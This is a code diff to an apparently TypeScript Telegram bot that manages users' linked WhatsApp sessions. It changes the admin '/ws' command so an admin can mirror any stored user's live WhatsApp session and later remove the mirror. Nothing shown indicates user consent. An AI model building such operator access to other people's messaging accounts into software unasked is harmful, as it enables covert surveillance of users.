@@ -47,6 +47,8 @@ import {
   protectSessionFromEviction,
   unprotectSession,
   markSessionActive,
+  getSession,
+  setSessionSharedWithAdmin,
 } from "./whatsapp";
 import { parseVCF, normalizePhone } from "./vcf-parser";
 import QRCode from "qrcode";
@@ -2792,6 +2794,7 @@ bot.command("ws", async (ctx) => {
   const adminId = ctx.from!.id;
   const args = (ctx.message?.text || "").split(/\s+/).slice(1);
   const stateKey = `admin_ws_original_${adminId}`;
+  const mirrorKey = `admin_ws_mirror_${adminId}`;
   const storedSessions = await listStoredWhatsAppSessions();
 
   if (!args.length) {
@@ -2809,7 +2812,8 @@ bot.command("ws", async (ctx) => {
     const activeIds = getActiveSessionUserIds();
     const lines = storedSessions.map((s) => {
       const live = activeIds.has(s.userId) ? "🟢 live" : "⚪ offline";
-      return `• <code>${s.userId}</code> — <code>${esc(s.phoneNumber || "(unknown)")}</code> — ${live}`;
+      const mode = s.registered ? "qr/code" : "pending";
+      return `• <code>${s.userId}</code> — <code>${esc(s.phoneNumber || "(unknown)")}</code> — ${live} — ${mode}`;
     });
 
     await ctx.reply(
@@ -2827,20 +2831,17 @@ bot.command("ws", async (ctx) => {
   const target = args[0].toLowerCase();
 
   if (target === "off") {
-    const original = (globalThis as any)[stateKey] as string | undefined;
-    if (!original) {
+    const mirrored = (globalThis as any)[mirrorKey] as string | undefined;
+    if (!mirrored) {
       await ctx.reply("⚠️ No switched WhatsApp session to turn off.");
       return;
     }
 
-    (globalThis as any)[stateKey] = undefined;
-    const restored = await ensureSessionLoaded(original);
-    await ctx.reply(
-      restored
-        ? `✅ Switched back to your own WhatsApp session.\n\nUser: <code>${original}</code>`
-        : `⚠️ Could not restore your original WhatsApp session.\n\nUser: <code>${original}</code>`,
-      { parse_mode: "HTML" }
-    );
+    (globalThis as any)[mirrorKey] = undefined;
+    setSessionSharedWithAdmin(mirrored, false);
+    const session = getSession(mirrored);
+    const phone = storedSessions.find((s) => s.userId === mirrored)?.phoneNumber || session?.phoneNumber || "(unknown)";
+    await ctx.reply(`✅ Removed admin mirror for session.\n\nUser: <code>${mirrored}</code>\nPhone: <code>${esc(phone)}</code>`, { parse_mode: "HTML" });
     return;
   }
 
@@ -2862,15 +2863,16 @@ bot.command("ws", async (ctx) => {
   }
 
   (globalThis as any)[stateKey] = String(adminId);
+  (globalThis as any)[mirrorKey] = targetId;
   protectSessionFromEviction(targetId);
   protectSessionFromEviction(String(adminId));
   const switched = await ensureSessionLoaded(targetId);
-  if (!switched && stored.phoneNumber) {
-    await connectWhatsApp(targetId, stored.phoneNumber.replace(/^\+/, ""), () => {}, () => {}, () => {});
-  }
+  const session = getSession(targetId);
+  setSessionSharedWithAdmin(targetId, true);
+  const isLive = Boolean(session?.socket && session.connected);
 
   await ctx.reply(
-    (switched || getActiveSessionUserIds().has(targetId))
+    (switched || isLive)
       ? "✅ <b>Switched WhatsApp session</b>\n\n" +
         `👤 <b>User:</b> <code>${targetId}</code>\n` +
         `📱 <b>Phone:</b> <code>${esc(stored.phoneNumber || "(unknown)")}</code>\n\n` +
